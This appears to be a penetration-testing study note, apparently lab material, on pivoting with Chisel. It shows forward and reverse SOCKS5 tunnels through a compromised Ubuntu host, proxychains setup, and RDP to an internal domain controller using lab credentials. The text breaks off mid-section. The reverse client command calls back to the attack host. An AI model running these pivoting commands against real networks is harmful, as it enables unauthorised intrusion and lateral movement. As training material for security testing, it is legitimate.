# 🧦 1. SOCKS5 Tunneling with Chisel (proxychains.conf port needs to be different from the chisle port)

> [!info] What is Chisel?  
> **Chisel** is a TCP/UDP tunneling tool written in **Go**. It uses **HTTP as the transport** and secures the tunnel using **SSH**.
> 
> Chisel is especially useful for pivoting when:
> 
> - 🧱 Firewall rules prevent direct access to an internal network.
>     
> - 🌐 The compromised host can communicate with the attack host.
>     
> - 🧦 You want a **SOCKS5 proxy** rather than forwarding only one specific port.
>     
> - 🔄 You need to reach multiple internal hosts/services through a pivot.
>     
> 
> The important mental model is:
> 
> ```text
> Attack Host
>      │
>      │ Chisel tunnel
>      ▼
> Compromised Pivot
>      │
>      │ Internal network access
>      ▼
> Internal Hosts
> ```
> 
> Chisel can work in either direction:
> 
> ```text
> Normal:
> Attack Host → Chisel Server on Pivot
> 
> Reverse:
> Pivot → Chisel Server on Attack Host
> ```

---

# 🌐 2. Network Scenario

The scenario contains an internal network:

```text
172.16.5.0/23
```

The Domain Controller is:

```text
172.16.5.19
```

The attack host cannot directly reach it because the attack host and the internal network are on different network segments.

However, we have compromised an Ubuntu server that can communicate with the internal network.

Conceptually:

```text
                 ATTACK HOST
                 10.10.14.17
                       │
                       │ ❌ Direct access
                       │
                       ▼
              ┌──────────────────┐
              │ Internal Network │
              │ 172.16.5.0/23   │
              └────────┬─────────┘
                       │
                       ▼
                DC: 172.16.5.19
```

The compromised Ubuntu host acts as the bridge:

```text
                 ATTACK HOST
                 10.10.14.17
                       │
                       │ Chisel
                       ▼
                ┌──────────────┐
                │ Ubuntu Pivot │
                │              │
                │ 10.129.202.64│
                │ 172.16.5.x   │
                └──────┬───────┘
                       │
                       │ ✅ Can reach
                       ▼
                172.16.5.19
                   Domain
                  Controller
```

The problem is therefore:

> **The attack host cannot reach the DC, but the compromised Ubuntu host can.**

Chisel gives the attack host a way to use that connectivity.

---

# 🧠 3. Why Chisel?

You could use several different pivoting techniques:

```text
Specific service
      │
      ├── SSH -L
      ├── Socat
      ├── Netsh portproxy
      └── Meterpreter portfwd
```

But if you want to access **multiple internal services**, a SOCKS proxy is more convenient:

```text
Attack Host
     │
     ▼
SOCKS5
     │
     ├────► 172.16.5.19:3389
     ├────► 172.16.5.25:445
     ├────► 172.16.5.50:80
     └────► other internal hosts
```

That's where Chisel becomes useful.

> [!important] Core idea  
> **Chisel creates a tunnel between the attack host and pivot and exposes a SOCKS5 proxy through which applications can reach destinations accessible from the pivot.**

---

# 📥 4. Clone Chisel

From the attack host:

```bash
git clone https://github.com/jpillora/chisel.git
```

Then enter the directory:

```bash
cd chisel
```

---

# 🔨 5. Build the Chisel Binary

Chisel is written in Go, so Go needs to be installed.

Build it with:

```bash
go build
```

This produces the Chisel binary:

```text
chisel
```

Conceptually:

```text
Chisel source code
        │
        │ go build
        ▼
    chisel binary
```

That binary can then be transferred to the pivot.

---

# ⚠️ 6. Binary Compatibility

> [!warning] Important  
> The source notes that differences in the **glibc** version between the target and workstation can cause compatibility problems with a built Chisel binary.
> 
> If the binary fails to execute on the target, compare the relevant library versions on both systems.
> 
> Another option is to use an **older prebuilt Chisel release** from the project's Releases section.

The general lesson is:

```text
Build binary
     │
     ▼
Transfer to target
     │
     ▼
Does it execute?
   /       \
 NO        YES
 │          │
 ▼          ▼
Check     Continue
compatibility
```

Don't immediately assume the Chisel configuration is wrong if the binary itself cannot execute.

---

# 📦 7. File Size and Transfer Considerations

The source points out that the size of tools transferred to a target can matter.

The example Chisel binary is:

```text
11 MB
```

and is transferred with:

```bash
scp chisel ubuntu@10.129.202.64:~/
```

Output:

```text
ubuntu@10.129.202.64's password:
chisel                                        100%   11MB   1.2MB/s   00:09
```

> [!important] CPTS mindset  
> During an engagement, transferring large binaries can have consequences beyond transfer speed.
> 
> Consider:
> 
> - Network traffic generated
>     
> - Disk artifacts
>     
> - Endpoint/security monitoring
>     
> - Time required to transfer
>     
> - Whether a smaller/prebuilt version is available
>     
> 
> The source specifically mentions shrinking the binary as a useful technique.

---

# 🖥️ 8. Start the Chisel Server on the Pivot

On the compromised Ubuntu host:

```bash
./chisel server -v -p 1234 --socks5
```

Output:

```text
2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

This makes the compromised Ubuntu host the **Chisel server**.

It listens on:

```text
0.0.0.0:1234
```

and enables SOCKS5:

```text
--socks5
```

The topology is now:

```text
ATTACK HOST
     │
     │ will connect to :1234
     ▼
┌──────────────────────┐
│ Ubuntu Pivot         │
│ Chisel Server        │
│ 0.0.0.0:1234         │
│ SOCKS5 enabled       │
└──────────────────────┘
```

---

# 🧩 9. What Does `--socks5` Do?

Without SOCKS, you could configure Chisel for specific port forwards.

With:

```bash
--socks5
```

the server provides SOCKS5 functionality.

This is useful because the attack host can then send connections for different internal destinations through the same tunnel.

For example:

```text
                    Chisel SOCKS5
                         │
          ┌──────────────┼──────────────┐
          ▼              ▼              ▼
      DC:3389        Server:445     Web:80
```

The SOCKS proxy doesn't need a separate Chisel server for each target.

---

# 🔌 10. Connect the Chisel Client from the Attack Host

From the attack host:

```bash
./chisel client -v 10.129.202.64:1234 socks
```

This is the client side of the connection.

The attack host is connecting to:

```text
10.129.202.64:1234
```

which is the Chisel server running on the compromised Ubuntu machine.

The critical relationship is:

```text
Attack Host
    │
    │ client
    ▼
Ubuntu Pivot
    │
    │ server
    ▼
Internal Network
```

---

# 🔍 11. Understanding the Chisel Client Output

The client reports:

```text
2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
```

The important part is:

```text
ws://
```

Chisel establishes its communication using a WebSocket-based connection over HTTP.

Then:

```text
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
```

This is extremely important.

The attack host now has:

```text
127.0.0.1:1080
```

as its local SOCKS endpoint.

So:

```text
Attack Host
127.0.0.1:1080
       │
       ▼
Chisel Client
       │
       ▼
Chisel Server
       │
       ▼
Internal Network
```

The client then reports:

```text
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

These messages indicate that the tunnel has successfully been established.

---

# 🔐 12. Chisel's Transport Model

The source describes Chisel as:

```text
TCP/UDP tunneling
        │
        ▼
HTTP transport
        │
        ▼
SSH-secured tunnel
```

A useful mental model is:

```text
Application
     │
     ▼
SOCKS5
     │
     ▼
Chisel Client
     │
     │ HTTP/WebSocket transport
     │ SSH-secured tunnel
     ▼
Chisel Server
     │
     ▼
Internal Target
```

> [!important]  
> Don't confuse the protocols here.
> 
> **SOCKS5** is the proxy interface your applications use.
> 
> **HTTP/WebSocket** is used to transport the Chisel connection.
> 
> **SSH** provides the secure tunnel mechanism inside Chisel.

---

# 🧦 13. Configure ProxyChains

The Chisel client created:

```text
127.0.0.1:1080
```

as the local SOCKS5 proxy.

Therefore, configure `/etc/proxychains.conf`:

```text
[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

The important line is:

```text
socks5 127.0.0.1 1080
```

This tells ProxyChains:

> "Send proxied connections to the SOCKS5 server listening locally on port 1080."

The complete chain becomes:

```text
Application
     │
     ▼
ProxyChains
     │
     ▼
127.0.0.1:1080
     │
     ▼
Chisel Client
     │
     ▼
HTTP/WebSocket + SSH tunnel
     │
     ▼
Chisel Server
     │
     ▼
Ubuntu Pivot
     │
     ▼
172.16.5.0/23
```

---

# 🔎 14. Verify the ProxyChains Configuration

The source uses:

```bash
tail -f /etc/proxychains.conf
```

and confirms:

```text
[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

The important thing is not `tail` itself.

It is simply being used to **inspect the end of the configuration file** and verify that the SOCKS5 entry exists.

---

# 🖥️ 15. Pivot to the Domain Controller

Now we can use ProxyChains with RDP:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

The destination is:

```text
172.16.5.19
```

The application believes it is connecting to:

```text
172.16.5.19:3389
```

But the connection actually follows:

```text
xfreerdp
   │
   ▼
ProxyChains
   │
   ▼
127.0.0.1:1080
   │
   ▼
Chisel Client
   │
   ▼
Chisel Server on Ubuntu
   │
   ▼
172.16.5.19:3389
```

This is the practical result of the pivot.

---

# 🧠 16. Why This Is Better Than a Single Port Forward Here

Suppose we only needed:

```text
172.16.5.19:3389
```

A simple port forward could be sufficient.

But suppose we discover:

```text
172.16.5.19:3389
172.16.5.19:445
172.16.5.19:88
172.16.5.25:80
172.16.5.30:3306
```

Creating a separate forwarding rule for every service becomes cumbersome.

With SOCKS:

```text
ProxyChains
     │
     ▼
Chisel SOCKS5
     │
     ├──► 172.16.5.19:3389
     ├──► 172.16.5.19:445
     ├──► 172.16.5.19:88
     ├──► 172.16.5.25:80
     └──► 172.16.5.30:3306
```

The same tunnel can service different destinations.

> [!tip] CPTS decision point  
> If you know **one exact service**, a port forward may be simpler.
> 
> If you need to interact with **many internal hosts/services**, SOCKS is usually much more convenient.

---

# 🔄 17. Chisel Reverse Pivot

The previous setup requires the attack host to connect to the Chisel server on the compromised Ubuntu host:

```text
Attack Host
     │
     │ inbound to pivot
     ▼
Ubuntu Chisel Server
```

But what if firewall rules prevent inbound connections to the compromised host?

Then this direction may fail:

```text
Attack Host ───❌──► Pivot
```

However, perhaps the pivot can connect outward:

```text
Pivot ───────► Attack Host
```

This is where **Chisel reverse mode** becomes useful.

---

# 🧠 18. Why Reverse Mode Exists

The fundamental question in pivoting is:

> **Which side can initiate the connection?**

Normal setup:

```text
Attack Host ─────► Pivot
```

Reverse setup:

```text
Pivot ─────► Attack Host
```

If the firewall blocks:

```text
Attack Host → Pivot
```

but allows:

```text
Pivot → Attack Host
```

then reverse Chisel can solve the connectivity problem.

---

# 🖥️ 19. Start the Reverse Chisel Server on the Attack Host

On the attack host:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Output:

```text
2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

The important option is:

```text
--reverse
```

This enables reverse tunneling.

The attack host is now running the Chisel server:

```text
ATTACK HOST
10.10.14.17
      │
      │ :1234
      ▼
Chisel Server
--reverse
```

---

# 🔌 20. Connect the Pivot to the Attack Host

On the Ubuntu pivot:

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

Now the **pivot initiates the connection**:

```text
Ubuntu Pivot
     │
     │ client
     │
     ▼
Attack Host
     │
     │ server --reverse
     ▼
Chisel reverse tunnel
```

The client output:

```text
2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

This confirms the reverse Chisel connection has been established.

---

# 🔀 21. What Does `R:socks` Mean?

The critical syntax is:

```text
R:socks
```

The `R` indicates a **reversed remote**.

Instead of:

```text
Attack Host
    │
    ▼
Pivot
```

the tunnel operates in the reverse direction:

```text
Pivot
    │
    ▼
Attack Host
```

The attack host then exposes the SOCKS proxy.

Conceptually:

```text
                    ATTACK HOST
                  Chisel Server
                       │
                  SOCKS :1080
                       │
                       ▼
                 Reverse tunnel
                       │
                       ▼
                 Ubuntu Pivot
                       │
                       ▼
              Internal Network
```

---

# 🧦 22. ProxyChains in Reverse Mode

The attack host can still configure:

```text
socks5 127.0.0.1 1080
```

in:

```text
/etc/proxychains.conf
```

So:

```text
proxychains
     │
     ▼
127.0.0.1:1080
     │
     ▼
Chisel reverse server
     │
     ▼
Chisel client on pivot
     │
     ▼
Internal network
```

Then:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

can reach the internal DC through the reverse tunnel.

---

# 🔄 23. Normal vs Reverse Chisel

This distinction is extremely impo